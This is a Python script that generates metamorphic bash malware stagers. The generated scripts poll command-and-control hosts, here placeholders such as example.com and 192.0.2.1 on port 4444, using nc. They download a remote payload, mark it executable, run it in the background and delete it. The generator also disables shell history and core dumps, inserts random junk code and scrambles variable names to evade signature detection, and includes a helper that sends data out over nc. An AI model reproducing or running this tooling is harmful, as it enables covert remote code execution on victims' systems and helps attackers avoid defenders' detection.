import random
import string
import unicodedata
import base64
import os
import re
import math
import datetime
import itertools
import sys

# Configuration
C2_ENDPOINTS = [
    ("example.com", 4444),
    ("example.com", 9000),
    ("example.com", 1337),
    ("192.0.2.1", 4444),
    ("192.0.2.1", 9000),
    ("192.0.2.1", 1337)
]

# --- Enhanced Variable/Function Name Morphing ---
def random_unicode_letter():
    pools = [
        string.ascii_letters,
        'ΑΒΓΔΕΖΗΘΙΚΛΜΝΞΟΠΡΣΤΥΦΧΨΩ',  # Greek uppercase
        'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',  # Cyrillic lowercase
        '𝒜𝒞𝒟𝒢𝒥𝒦𝒩𝒪𝒫𝒬𝒮𝒯𝒰𝒱𝒲𝒳𝒴𝒵',  # Math script
        '𝓐𝓑𝓒𝓓𝓔𝓕𝓖𝓗𝓘𝓙𝓚𝓛𝓜𝓝𝓞𝓟𝓠𝓡𝓢𝓣𝓤𝓥𝓦𝓧𝓨𝓩',  # Math bold script
        '𝔸𝔹ℂ𝔻𝔼𝔽𝔾ℍ𝕀𝕁𝕂𝕃𝕄ℕ𝕆ℙℚℝ𝕊𝕋𝕌𝕍𝕎𝕏𝕐ℤ'  # Double-struck
    ]
    pool = random.choice(pools)
    return random.choice(pool)

def morph_name(base, min_len=8, max_len=20):
    # Only use bash-valid variable name characters
    safe_chars = string.ascii_letters + string.digits + '_'
    name = ''.join(random.choice([c, random.choice(safe_chars)]) for c in base)
    chars = list(name)

    # Enhanced case mixing
    chars = [c.upper() if random.random() < 0.5 else c.lower() for c in chars]

    # Add more complex prefixes and suffixes (only valid chars)
    prefixes = ['_', 'tmp', 'var', 'x', 'z', 'obj', 'str', 'int', 'bool', 'arr', 'ptr', 'ref', 'val', 'dat', 'buf']
    suffixes = ['_', 'Obj', 'Val', 'Str', 'Int', 'Arr', 'List', 'Dict', 'Hash', 'Map', 'Ptr', 'Ref', 'Buf', 'Mem', 'Reg']

    if random.random() < 0.6:
        chars.insert(0, random.choice(prefixes))
    if random.random() < 0.6:
        chars.append(random.choice(suffixes))

    # Ensure minimum length
    if len(chars) < min_len:
        chars += [random.choice(safe_chars) for _ in range(min_len - len(chars))]
    if len(chars) > max_len:
        chars = chars[:max_len]

    # Ensure starts with letter or underscore
    if not chars[0].isalpha() and chars[0] != '_':
        chars[0] = random.choice(string.ascii_letters + '_')

    return ''.join(chars)

# --- Enhanced String Obfuscation ---
def obfuscate_string(s):
    methods = ["b64", "hex", "chararray", "split", "printf", "echo", "cat", "rev", "xor"]
    method = random.choice(methods)
    
    if method == "b64":
        b64 = base64.b64encode(s.encode()).decode()
        return f"$(echo '{b64}' | base64 -d)"
    
    elif method == "hex":
        hex_str = ''.join([f'\\x{ord(c):02x}' for c in s])
        return f"printf '{hex_str}'"
    
    elif method == "chararray":
        chars = [f"\\$(printf '\\%o' {ord(c)})" for c in s]
        return f"printf {' '.join(chars)}"
    
    elif method == "split":
        chars = [f"'{c}'" for c in s]
        return f"printf {' '.join(chars)}"
    
    elif method == "printf":
        format_parts = []
        values = []
        for i, c in enumerate(s):
            format_parts.append(f"\\%c")
            values.append(f"'{c}'")
        return f"printf '{''.join(format_parts)}' {' '.join(values)}"
    
    elif method == "echo":
        return f"echo -e '{s}'"
    
    elif method == "cat":
        return f"cat <<< '{s}'"
    
    elif method == "rev":
        return f"echo '{s[::-1]}' | rev"
    
    elif method == "xor":
        key = random.randint(1, 255)
        xored = ''.join(chr(ord(c) ^ key) for c in s)
        hex_str = ''.join([f'\\x{ord(c):02x}' for c in xored])
        return f"printf '{hex_str}' | xxd -p -c1 | while read -r line; do printf '\\x%02x' $((0x$line ^ {key})); done"

# --- Enhanced Integer Obfuscation ---
def obfuscate_int(n):
    methods = ["math", "hex", "str_parse", "split_sum"]
    method = random.choice(methods)
    
    if method == "math":
        a = random.randint(1, n)
        b = n - a
        return f"$(({a}+{b}))"
    elif method == "hex":
        return f"$((0x{n:x}))"
    elif method == "str_parse":
        return f"$(({n}))"
    elif method == "split_sum":
        parts = []
        left = n
        while left > 0:
            part = random.randint(1, left)
            parts.append(str(part))
            left -= part
        return f"$({' + '.join(parts)})"
    return str(n)

# --- Enhanced Junk Code Generation ---
def random_junk_code():
    json_str = '{"key":"value"}'
    junk_types = [
        lambda: f"# {''.join(random.choices(string.ascii_letters, k=30))}",
        lambda: f"{morph_name('junkvar')}='{''.join(random.choices(string.ascii_letters, k=15))}'",
        lambda: f"function {morph_name('junkfunc')} {{ echo $1; }}",
        lambda: f"if [ $(({obfuscate_int(1)}+{obfuscate_int(1)})) -eq {obfuscate_int(2)} ]; then :; fi",
        lambda: f": $(({obfuscate_int(1)}+{obfuscate_int(1)}))",
        lambda: f"{morph_name('arr')}=($(seq {obfuscate_int(1)} {obfuscate_int(10)} | shuf -n {obfuscate_int(5)}))",
        lambda: f"{morph_name('str')}='{''.join(random.choices(string.ascii_letters, k=12))}'",
        lambda: f"{morph_name('num')}={obfuscate_int(random.randint(1, 1000))}",
        lambda: f"{morph_name('bool')}={random.choice(['true', 'false'])}",
        lambda: f"{morph_name('date')}=$(date)",
        lambda: f"{morph_name('uuid')}=$(uuidgen)",
        lambda: f"{morph_name('hash')}='key=value'",
        lambda: f"{morph_name('regex')}='.*'",
        lambda: f"{morph_name('xml')}='<root><item>test</item></root>'",
        lambda: f"{morph_name('json')}='{json_str}'"
    ]
    return random.choice(junk_types)()

def generate_unique_filename():
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    random_suffix = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    return f"payload_{timestamp}_{random_suffix}.sh"

# --- Linux-specific Evasion Techniques ---
def random_evasion_technique():
    """Return a random Linux evasion technique snippet."""
    techniques = []
    
    # Technique 1: Disable core dumps
    t1 = """
# Disable core dumps
ulimit -c 0
"""
    techniques.append(t1)

    # Technique 2: Clear environment variables
    t2 = """
# Clear sensitive environment variables
unset HISTFILE
unset HISTSIZE
unset HISTFILESIZE
unset HISTCONTROL
unset HISTIGNORE
"""
    techniques.append(t2)

    # Technique 3: Disable job control
    t3 = """
# Disable job control
set +m
"""
    techniques.append(t3)

    # Technique 4: Clear terminal
    t4 = """
# Clear terminal
clear
"""
    techniques.append(t4)

    # Technique 5: Disable shell history
    t5 = """
# Disable shell history
set +o history
"""
    techniques.append(t5)

    # Randomly select only 1 technique for each payload
    selected = random.choice(techniques)
    # Add junk code after for more metamorphism
    return selected + '\n' + random_junk_code()

def generate_metamorphic_payload():
    try:
        filename = generate_unique_filename()
        # Morph all variable names
        vars = {k: morph_name(k) for k in [
            'client', 'stream', 'bytes', 'data', 'sendback', 'sendback2', 'sendbyte', 'encoding',
            'readLength', 'cmd', 'result', 'junk', 'junk2', 'junk3', 'success', 'socket', 'buffer'
        ]}

        # Evasion technique section
        evasion = random_evasion_technique()

        # Network Operations with enhanced obfuscation
        network = f"""
# Network Operations
while true; do
    for endpoint in "{random.choice(C2_ENDPOINTS)[0]}:{random.choice(C2_ENDPOINTS)[1]}" "{random.choice(C2_ENDPOINTS)[0]}:{random.choice(C2_ENDPOINTS)[1]}"; do
        host="${{endpoint%%:*}}"
        port="${{endpoint##*:}}"
        
        # Try to connect
        if nc -z -w 5 "$host" "$port" 2>/dev/null; then
            # Create temporary file
            {morph_name('buffer')}=$(mktemp)
            
            # Receive data
            if nc -w 10 "$host" "$port" > "${{{morph_name('buffer')}}}" 2>/dev/null; then
                # Check if we got any data
                if [ -s "${{{morph_name('buffer')}}}" ]; then
                    # Make executable and run
                    chmod +x "${{{morph_name('buffer')}}}"
                    "${{{morph_name('buffer')}}}" &
                    # Wait a bit to ensure it started
                    sleep 2
                    # Clean up
                    rm -f "${{{morph_name('buffer')}}}"
                fi
            fi
        fi
    done
    # Random sleep between attempts
    sleep $((RANDOM % 30 + 10))
done
"""

        # Prepare all blocks except evasion
        blocks = [network]

        # Insert more junk code randomly (but never before evasion)
        for _ in range(random.randint(15, 25)):
            idx = random.randint(0, len(blocks))
            blocks.insert(idx, random_junk_code())

        # Add shebang and error handling
        code = "#!/bin/bash\nset -e\n\n"
        
        # Add enhanced helper functions
        code += """
# Enhanced helper functions
function str_to_bytes() {
    echo -n "$1" | xxd -p
}

function to_base64() {
    echo -n "$1" | base64
}

function from_base64() {
    echo -n "$1" | base64 -d
}

function to_hex() {
    echo -n "$1" | xxd -p
}

function from_hex() {
    echo -n "$1" | xxd -r -p
}

function rot13() {
    echo "$1" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
}

function to_unicode() {
    echo -n "$1" | xxd -p | sed 's/\(..\)/\\\\u00\\1/g'
}

function from_unicode() {
    echo -n "$1" | sed 's/\\\\u00\(..\)/\\1/g' | xxd -r -p
}

function to_binary() {
    echo -n "$1" | xxd -b | cut -d' ' -f2-7 | tr -d ' '
}

function from_binary() {
    echo "$1" | sed 's/\(........\)/\\1 /g' | tr -d ' ' | perl -lpe '$_=pack("B*",$_)'
}

# Network helper functions
function check_connection() {
    local host="$1"
    local port="$2"
    nc -z -w 5 "$host" "$port" >/dev/null 2>&1
    return $?
}

function receive_data() {
    local host="$1"
    local port="$2"
    local timeout="$3"
    local output="$4"
    nc -w "$timeout" "$host" "$port" > "$output" 2>/dev/null
    return $?
}

function send_data() {
    local host="$1"
    local port="$2"
    local data="$3"
    echo -n "$data" | nc -w 5 "$host" "$port" 2>/dev/null
    return $?
}

function verify_payload() {
    local file="$1"
    if [ -f "$file" ] && [ -s "$file" ] && [ -x "$file" ]; then
        return 0
    fi
    return 1
}

function cleanup() {
    local file="$1"
    if [ -f "$file" ]; then
        rm -f "$file"
    fi
}

# Error handling
trap 'cleanup "${{{morph_name('buffer')}}}"' EXIT
\n\n"""

        # Add evasion first, then all other blocks
        code += evasion + '\n' + '\n'.join(blocks)

        # Save with unique filename
        with open(filename, 'w') as f:
            f.write(code)
        os.chmod(filename, 0o755)  # Make executable
        return filename
    except Exception as e:
        print(f"Error generating payload: {e}", file=sys.stderr)
        # Create a basic error payload
        error_filename = f"error_payload_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.sh"
        with open(error_filename, 'w') as f:
            f.write(f"# Error generating payload: {str(e)}\n")
            f.write("echo 'Failed to generate payload'\n")
        os.chmod(error_filename, 0o755)
        return error_filename

if __name__ == "__main__":
    try:
        filename = generate_metamorphic_payload()
        print(f"Metamorphic payload written to {filename}")
    except Exception as e:
        print("ERROR: Exception during payload generation:", e, file=sys.stderr)
        import traceback
        traceback.print_exc()
        with open('payload_error.sh', 'w') as f:
            f.write(f"# ERROR: {e}\n")
        os.chmod('payload_error.sh', 0o755)
        exit(1)
